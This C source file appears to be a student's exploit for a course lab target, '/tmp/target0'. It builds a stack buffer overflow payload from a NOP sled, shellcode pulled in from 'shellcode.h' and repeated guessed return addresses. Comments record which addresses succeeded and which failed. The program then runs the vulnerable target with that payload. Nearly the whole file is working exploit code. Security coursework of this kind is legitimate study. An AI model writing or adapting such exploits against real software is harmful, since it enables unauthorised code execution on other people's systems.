#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

int main(void)
{
  char *args[3]; 
  char *env[1];
  
  args[0] = TARGET;
  args[1] = "";

  char str[408];
  memset(str, 0, 408);
  strcpy(str, "\x90\x90\x90");
  for (int i = 0; i < 200; ++i)
  {
  	strcat(str, "\x90");
  }
  strcat(str, shellcode);
  for (int i = 0; i < 38; ++i)
  {
  	// strcat(str, "\x2c\xfb\xff\xbf");
  	// strcat(str, "\x20\xfb\xff\xbf");
    // bffffbd4

    // success
    // - 149
  	// strcat(str, "\x77\xfb\xff\xbf");
    // - 150
  	// strcat(str, "\x70\xfb\xff\xbf");
    // - 151
  	// strcat(str, "\x6f\xfb\xff\xbf");
    // - 152
  	// strcat(str, "\x6e\xfb\xff\xbf");
    // - 153
  	// strcat(str, "\x6d\xfb\xff\xbf");
    // - 154
  	// strcat(str, "\x6c\xfb\xff\xbf");

    // 0x90 inside higher bound
  	// strcat(str, "\xf0\xfb\xff\xbf");

    // 0x90 inside lower bound
    // strcat(str, "\x30\xfb\xff\xbf");

    // failed

    // 0x90 outside higher bound
    strcat(str, "\x00\xfc\xff\xbf");
    strcat(str, "\xf7\xfc\xff\xbf");
    // 0x90 outside lower bound
    // strcat(str, "\x10\xfb\xff\xbf");
    // strcat(str, "\x2a\xfb\xff\xbf");


  }
  args[1] = str;
  args[2] = NULL;
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}

